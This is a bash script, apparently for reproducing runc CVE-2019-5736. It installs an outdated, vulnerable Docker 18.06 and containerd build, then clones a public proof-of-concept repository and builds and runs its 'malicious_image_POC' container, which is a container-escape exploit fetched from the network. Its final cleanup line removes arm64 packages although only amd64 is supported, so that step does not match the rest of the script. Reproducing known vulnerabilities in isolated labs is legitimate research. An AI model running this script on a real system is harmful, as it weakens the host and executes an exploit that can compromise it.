#!/bin/bash

ARCH=$(uname --m)

case $ARCH in
x86_64)
    ARCH="amd64"
    ;;
*)
    echo "Unsupported architecture"
    exit
    ;;
esac

sudo apt install -y wget libltdl7
wget https://download.docker.com/linux/ubuntu/dists/xenial/pool/stable/"$ARCH"/containerd.io_1.2.6-3_"$ARCH".deb
sudo dpkg -i containerd.io_1.2.6-3_"$ARCH".deb
wget https://download.docker.com/linux/ubuntu/dists/xenial/pool/stable/"$ARCH"/docker-ce_18.06.0~ce~3-0~ubuntu_"$ARCH".deb
sudo dpkg -i docker-ce_18.06.0~ce~3-0~ubuntu_"$ARCH".deb
sudo apt --fix-broken install -f -y

STATUS=$(sudo systemctl is-active docker)

if [ "$STATUS" = "active" ]; then
    git clone https://github.com/twistlock/RunC-CVE-2019-5736
    cd RunC-CVE-2019-5736/malicious_image_POC || exit
    sudo docker build -t image_name:latest .
    sudo docker run --rm image_name:latest
    cd ../.. && rm -rf RunC-CVE-2019-5736
fi

rm -f docker-ce_18.06.0~ce~3-0~ubuntu_arm64.deb containerd.io_1.2.6-3_arm64.deb
